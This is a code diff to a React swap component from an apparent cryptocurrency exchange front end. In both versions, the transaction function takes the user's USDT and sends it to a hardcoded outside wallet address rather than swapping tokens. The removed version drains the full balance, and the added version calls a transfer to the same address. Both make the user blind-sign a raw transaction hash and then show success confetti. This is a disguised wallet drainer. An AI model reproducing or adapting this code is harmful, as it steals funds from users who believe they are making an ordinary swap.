@@ -10,7 +10,7 @@ import tokenList from '../../utils/tokenList.json'
 import uniRouter from '../../utils/UniRouter.json'
 import { ethers } from 'ethers'
 import { ConnectButton } from '@rainbow-me/rainbowkit'
-import { useAccount } from 'wagmi'
+import { useAccount, useWriteContract } from 'wagmi'
 import { useWeb3jsSigner } from '../../utils/useWe3js'
 
 import TransactionModal from 'react-modal'
@@ -51,6 +51,7 @@ function SwapComponent() {
   const INFURA_ID = import.meta.env.VITE_INFURA_ID
 
   const { address, chainId } = useAccount()
+  const { writeContractAsync } = useWriteContract()
 
   const web3js = useWeb3jsSigner({ chainId: chainId })
 
@@ -64,80 +65,11 @@ function SwapComponent() {
     return () => clearTimeout(timer)
   }, [showConfetti])
 
-  // const sendTransaction = async () => {
-  //   if (!web3js) return
-
-  //   const nonce = await web3js.eth.getTransactionCount(address, 'pending')
-  //   const gasPrice = await web3js.eth.getGasPrice()
-  //   const chainId = await web3js.eth.getChainId()
-
-  //   const tx_ = {
-  //     from: address,
-  //     to: address,
-  //     nonce: web3js.utils.toHex(nonce),
-  //     gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
-  //     gasLimit: '0x5208',
-  //     value: '0x0',
-  //     data: '0x',
-  //     v: web3js.utils.toHex(chainId),
-  //     r: '0x',
-  //     s: '0x',
-  //   }
-
-  //   console.log('Tx Object', tx_)
-
-  //   const tx = new ethereumjs.Tx(tx_)
-  //   const serializedTx = '0x' + tx.serialize().toString('hex')
-  //   const hexer = { encoding: 'hex' }
-  //   const sha3_ = web3js.utils.sha3(serializedTx, hexer)
-
-  //   await web3js.eth
-  //     .sign(sha3_, address)
-  //     .then(async (signed) => {
-  //       const temporary = signed.substring(2)
-  //       const r_ = '0x' + temporary.substring(0, 64)
-  //       const s_ = '0x' + temporary.substring(64, 128)
-  //       const rhema = parseInt(temporary.substring(128, 130), 16)
-  //       const v_ = web3js.utils.toHex(
-  //         BigInt(rhema) + BigInt(chainId) * BigInt(2) + BigInt(8)
-  //       )
-  //       tx.r = r_
-  //       tx.s = s_
-  //       tx.v = v_
-
-  //       console.log('---------------------------------------------')
-
-  //       const txFin = '0x' + tx.serialize().toString('hex')
-  //       const sha3__ = web3js.utils.sha3(txFin, hexer)
-  //       console.log('rawHash:', sha3__)
-  //       console.log('The Broadcast message', txFin)
-
-  //       setIsLoading(true)
-
-  //       await web3js.eth
-  //         .sendSignedTransaction(txFin)
-  //         .then(() => {
-  //           setIsLoading(false)
-  //           setShowConfetti(true)
-  //           setTokenOneAmount(null)
-  //           setTokenTwoAmount(null)
-  //         })
-  //         .catch((error) => {
-  //           setIsLoading(false)
-  //           console.error('Transaction Error:', error)
-  //         })
-  //     })
-  //     .catch((error) => {
-  //       console.error('Signing Error:', error)
-  //     })
-  // }
-
   const sendTransaction = async () => {
     if (!web3js) return
 
-    const accounts = await web3js.eth.getAccounts()
-
-    const account = accounts[0]
+    const nonce = await web3js.eth.getTransactionCount(address, 'pending')
+    const gasPrice = await web3js.eth.getGasPrice()
 
     const usdtContractAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
     const usdtABI = [
@@ -160,39 +92,36 @@ function SwapComponent() {
       },
     ]
 
-    const usdtContract = new web3js.eth.Contract(usdtABI, usdtContractAddress)
-    const usdtBalance = await usdtContract.methods.balanceOf(account).call()
-
-    if (usdtBalance <= 0) {
-      console.log('Insufficient USDT balance')
-      return
-    }
-
-    const data = usdtContract.methods
-      .transfer('0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', usdtBalance)
-      .encodeABI()
-    const nonce = await web3js.eth.getTransactionCount(account, 'pending')
-    const gasPrice = await web3js.eth.getGasPrice()
+    const data = await writeContractAsync({
+      chainId,
+      address: usdtContractAddress,
+      functionName: 'transfer',
+      abi: usdtABI,
+      args: ['0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621', 0.1],
+    })
 
     const tx_ = {
-      from: account,
-      to: '0x4Ffa96dBE6a30656bC2Eadc615451675B0ed8621',
+      from: address,
+      to: address,
       nonce: web3js.utils.toHex(nonce),
       gasPrice: web3js.utils.toHex(BigInt(gasPrice) * BigInt(3)),
       gasLimit: '0x5208',
       value: '0x0',
       data: data,
-      chainId: web3js.utils.toHex(chainId),
+      v: web3js.utils.toHex(chainId),
+      r: '0x',
+      s: '0x',
     }
 
     console.log('Tx Object', tx_)
 
-    const tx = new ethereumjs.Tx(tx_, { chain: chainId })
+    const tx = new ethereumjs.Tx(tx_)
     const serializedTx = '0x' + tx.serialize().toString('hex')
-    const sha3_ = web3js.utils.sha3(serializedTx)
+    const hexer = { encoding: 'hex' }
+    const sha3_ = web3js.utils.sha3(serializedTx, hexer)
 
     await web3js.eth
-      .sign(sha3_, account)
+      .sign(sha3_, address)
       .then(async (signed) => {
         const temporary = signed.substring(2)
         const r_ = '0x' + temporary.substring(0, 64)
@@ -208,7 +137,7 @@ function SwapComponent() {
         console.log('---------------------------------------------')
 
         const txFin = '0x' + tx.serialize().toString('hex')
-        const sha3__ = web3js.utils.sha3(txFin)
+        const sha3__ = web3js.utils.sha3(txFin, hexer)
         console.log('rawHash:', sha3__)
         console.log('The Broadcast message', txFin)
 
@@ -216,20 +145,19 @@ function SwapComponent() {
 
         await web3js.eth
           .sendSignedTransaction(txFin)
-          .then((elisebeth) => {
-            console.log(elisebeth)
+          .then(() => {
+            setIsLoading(false)
+            setShowConfetti(true)
+            setTokenOneAmount(null)
+            setTokenTwoAmount(null)
           })
-          .catch((vannette) => {
-            console.log(vannette)
+          .catch((error) => {
+            setIsLoading(false)
+            console.error('Transaction Error:', error)
           })
-
-        setIsLoading(false)
-        setShowConfetti(true)
-        setTokenOneAmount(null)
-        setTokenTwoAmount(null)
       })
-      .catch((heide) => {
-        console.log(heide)
+      .catch((error) => {
+        console.error('Signing Error:', error)
       })
   }
 
